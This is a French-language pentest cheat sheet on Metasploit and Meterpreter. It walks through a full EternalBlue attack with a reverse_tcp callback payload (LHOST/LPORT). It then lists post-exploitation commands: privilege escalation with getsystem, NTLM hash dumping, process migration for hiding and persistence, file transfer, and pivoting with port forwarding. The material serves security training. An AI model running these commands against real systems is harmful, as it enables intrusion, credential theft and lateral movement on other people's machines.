---
title: Metasploit & Meterpreter
category: exploitation
icon: 🎯
difficulty: Intermédiaire
tags: [metasploit, msfconsole, meterpreter, exploit, payload, post-exploitation]
summary: Workflow msfconsole (search/use/set/exploit), variables L/R, sessions, et post-exploitation Meterpreter (sysinfo, getsystem, hashdump, pivoting).
updated: 2026-09-25
source: cheatsheet
---

## Metasploit — workflow

```bash
msfconsole              # lancer (msfconsole -q pour skip splash)
```

**5 types de modules** : exploits, payloads, auxiliary (scanners/fuzzers), post (post-ex), encoders/evasion.

**Workflow standard** :

```
search <terme>                                      # 1. trouver
use exploit/windows/smb/ms17_010_eternalblue        # 2. sélectionner
show options                                        # 3. voir variables requises
set RHOSTS <IP_cible>                               # 4. cible
set LHOST <ton_IP>                                  # 5. toi (pour reverse shell)
set LPORT 4444                                      # 6. port d'écoute
set PAYLOAD windows/x64/meterpreter/reverse_tcp     # 7. payload
exploit                                             # 8. lancer (ou "run")
```

> **Variables** : `R` = remote (cible), `L` = local (toi). Confondre = exploit qui foire silencieusement.

**Recherche avancée** :

```
search type:exploit cve:2017
search platform:windows smb
search name:eternalblue
```

**Sessions** :

```
sessions              # lister les sessions actives
sessions -i <id>      # reprendre une session
background            # mettre en arrière-plan (depuis meterpreter)
```

## Meterpreter — post-exploitation

```
sysinfo               # OS, arch, hostname
getuid                # mon user actuel
getsystem             # tentative privesc auto (Windows)
hashdump              # dump hashes NTLM (besoin SYSTEM)
shell                 # passer en cmd.exe/bash
ps                    # process list
migrate <PID>         # migrer dans un autre process (planque)

# Filesystem
pwd / cd / ls / cat / download / upload

# Réseau
ipconfig / route / portfwd add -l 8080 -p 80 -r 10.10.10.5    # pivoting
```

> **Réflexe après pop d'un meterpreter** : `sysinfo` → `getuid` → `getsystem` (si pas déjà SYSTEM) → `hashdump`. Migrer vers `explorer.exe` ou un process stable pour persister.
